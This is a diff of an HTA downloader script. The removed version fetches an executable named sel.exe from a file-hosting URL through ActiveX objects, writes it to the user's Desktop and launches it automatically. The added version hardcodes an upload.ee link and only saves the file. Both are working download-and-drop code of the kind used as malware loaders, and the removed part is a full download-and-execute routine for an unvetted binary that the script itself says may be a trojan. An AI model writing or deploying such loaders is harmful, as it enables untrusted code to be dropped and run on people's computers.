@@ -1,13 +1,9 @@
 <!-- saved from url=(0014)about:internet -->
 <hta:application
     id="Downloader"
-    applicationname="sel.exe Downloader"
+    applicationname="Simple Downloader Test"
     border="thin"
-    borderstyle="normal"
     caption="yes"
-    contextmenu="no"
-    maximizebutton="yes"
-    minimizebutton="yes"
     showintaskbar="yes"
     singleinstance="yes"
     sysmenu="yes"
@@ -16,116 +12,86 @@
 
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>sel.exe Downloader + Auto Run</title>
+    <title>Download Test - No Execution</title>
     <style>
         body {
-            font-family: Segoe UI, Arial, sans-serif;
-            background: #1e1e1e;
-            color: #e0e0e0;
-            padding: 30px;
+            font-family: Segoe UI, Consolas, monospace;
+            background: #111;
+            color: #0f0;
+            padding: 25px;
             margin: 0;
+            font-size: 14px;
         }
         h1 { color: #ff4444; }
-        input[type=text] {
-            width: 100%;
-            padding: 10px;
-            font-size: 14px;
-            background: #333;
-            color: #fff;
-            border: 1px solid #555;
-            margin: 10px 0;
+        #status {
+            background: #000;
+            border: 1px solid #333;
+            padding: 15px;
+            min-height: 180px;
+            white-space: pre-wrap;
+            overflow: auto;
         }
         button {
-            padding: 12px 30px;
-            font-size: 16px;
-            background: #0066cc;
+            padding: 10px 25px;
+            font-size: 15px;
+            background: #006600;
             color: white;
             border: none;
             cursor: pointer;
+            margin: 15px 0;
         }
-        button:hover { background: #0055aa; }
-        #status {
-            margin-top: 20px;
-            padding: 15px;
-            background: #222;
-            border: 1px solid #444;
-            min-height: 120px;
-            white-space: pre-wrap;
-            font-family: Consolas, monospace;
-        }
-        .warning { color: #ffcc00; font-weight: bold; }
+        button:hover { background: #008800; }
     </style>
 </head>
 
 <body>
 
-<h1>sel.exe Downloader (Desktop + Auto Run)</h1>
+<h1>Test Downloader (Desktop only - no run)</h1>
+<p>Attempts to download from: https://www.upload.ee/files/19029808/sel.exe.html<br>
+<strong>Warning:</strong> This URL is NOT direct → you'll probably get HTML instead of .exe</p>
 
-<p class="warning">VERY IMPORTANT – READ THIS:<br>
-1. The link you gave is NOT a direct file link — it's a page with timer/captcha/ads.<br>
-2. You MUST get the REAL direct .exe URL first (instructions below).<br>
-3. .exe files from upload.ee are often flagged as dangerous (viruses, trojans, ...).<br>
-→ Scan with VirusTotal BEFORE running!<br>
-→ Run at your own risk — I strongly advise against blind auto-execution.</p>
+<button onclick="startDownload()">Start Download to Desktop</button>
 
-<label for="url">Direct .exe URL (not the .html page!):</label><br>
-<input type="text" id="url" value="" placeholder="Paste REAL direct link here (e.g. https://...upload.ee/.../sel.exe?token=...)" />
-
-<br><br>
-
-<button onclick="startDownload()">Download to Desktop + Auto Run</button>
-
-<div id="status"></div>
+<div id="status">Ready...</div>
 
 <script language="JScript">
     function startDownload() {
-        var url = document.getElementById("url").value.trim();
-        if (!url) {
-            alert("Please paste the DIRECT download URL first!");
-            return;
-        }
-
+        var url = "https://www.upload.ee/files/19029808/sel.exe.html";
         var status = document.getElementById("status");
-        status.innerHTML = "Starting...\n\n";
+        status.innerHTML = "Starting download attempt...\nURL: " + url + "\n";
 
-        // Get Desktop path
         var shell = new ActiveXObject("WScript.Shell");
-        var desktopPath = shell.SpecialFolders("Desktop");
-        var localFile = desktopPath + "\\sel.exe";
+        var desktop = shell.SpecialFolders("Desktop");
+        var filePath = desktop + "\\sel.exe";
 
-        status.innerHTML += "Target location: " + localFile + "\n";
+        status.innerHTML += "Target: " + filePath + "\n\n";
 
         try {
             var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
-            xhr.open("GET", url, false);           // synchronous
+            xhr.open("GET", url, false);
             xhr.send();
 
-            if (xhr.Status === 200) {
+            status.innerHTML += "HTTP Status: " + xhr.Status + " " + xhr.statusText + "\n";
+            status.innerHTML += "Content-Type: " + xhr.getResponseHeader("Content-Type") + "\n";
+            status.innerHTML += "Content-Length: " + (xhr.getResponseHeader("Content-Length") || "unknown") + " bytes\n\n";
+
+            if (xhr.Status == 200) {
                 var stream = new ActiveXObject("ADODB.Stream");
-                stream.Type = 1;                       // adTypeBinary
+                stream.Type = 1; // binary
                 stream.Open();
                 stream.Write(xhr.responseBody);
-                stream.SaveToFile(localFile, 2);       // 2 = overwrite
+                stream.SaveToFile(filePath, 2); // 2 = overwrite
                 stream.Close();
 
-                status.innerHTML += "\nDownload OK → saved to Desktop\\sel.exe\n\nLaunching...";
-
-                // Auto-run the downloaded file
-                try {
-                    shell.Run('"' + localFile + '"', 1, false);
-                    status.innerHTML += "\nExecuted → check if program started.";
-                    alert("Download finished and program launched!\nFile: " + localFile);
-                } catch (runErr) {
-                    status.innerHTML += "\nAuto-run failed: " + runErr.message + "\n(You can still run it manually from Desktop)";
-                    alert("File saved, but could not auto-run:\n" + runErr.message);
-                }
+                status.innerHTML += "File saved to Desktop\\sel.exe\n\n";
+                status.innerHTML += "Check file size: if only a few KB → it's the webpage HTML, not the real .exe\n";
+                status.innerHTML += "You need the DIRECT link (from browser Network tab after clicking download).";
             } else {
-                status.innerHTML += "\nHTTP error " + xhr.Status + " – probably wrong link (got HTML page instead of .exe?)";
-                alert("Download failed – HTTP " + xhr.Status);
+                status.innerHTML += "Download failed (non-200 response).";
             }
-        } catch (e) {
-            status.innerHTML += "\nError: " + e.message + "\n(Internet issue / security block / ActiveX disabled?)";
-            alert("Failed: " + e.message);
+        } catch(e) {
+            status.innerHTML += "ERROR: " + e.message + "\n";
+            status.innerHTML += "(Internet blocked? mshta restrictions? ActiveX disabled?)";
         }
     }
 </script>
